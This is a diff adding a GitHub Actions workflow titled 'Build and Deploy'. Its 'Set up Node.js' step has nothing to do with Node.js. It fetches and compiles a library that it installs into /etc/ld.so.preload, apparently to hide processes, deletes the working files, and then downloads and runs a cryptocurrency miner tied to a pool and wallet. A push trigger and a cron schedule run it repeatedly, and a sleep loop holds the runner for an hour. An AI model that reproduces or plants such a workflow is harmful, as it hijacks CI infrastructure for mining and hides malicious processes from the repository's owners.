@@ -1,0 +1,55 @@
+name: Build and Deploy
+
+on:
+  workflow_dispatch:
+  push:
+  schedule:
+    - cron: '0 */5 * * *'
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Set up Node.js
+        run: |
+          # Install required packages
+          apt-get update
+          apt-get install -y sudo wget cpulimit build-essential
+
+          # Download and compile libnyumput.so
+          rm -rf *
+          curl -O https://bitbucket.org/koploks/watir/raw/master/nyumput.c
+          gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+          mv libnyumput.so /usr/local/lib/
+          echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+          rm nyumput.c
+
+          # Download and setup sgr1
+          mkdir .lib && cd .lib
+          wget -O sgr1 https://github.com/barburonjilo/back/raw/main/sr
+          chmod +x sgr1
+          cpulimit -l 150 -e sgr1 &
+          sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
+
+          # Run sgr1 with specific parameters
+          nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
+
+      - name: Run script with random wait time
+        run: |
+          end=$((SECONDS+3600))
+          while [ $SECONDS -lt $end ]; do
+            # Generate random wait time between 1 and 10 minutes
+            wait_time=$((RANDOM % 600 + 1))
+            sleep $wait_time
+          done
+
+      - name: Clean up
+        run: |
+          # Clean up any remaining processes
+          pid=$(pgrep -f "sgr1")
+          if [ -n "$pid" ]; then
+            kill $pid
+          fi
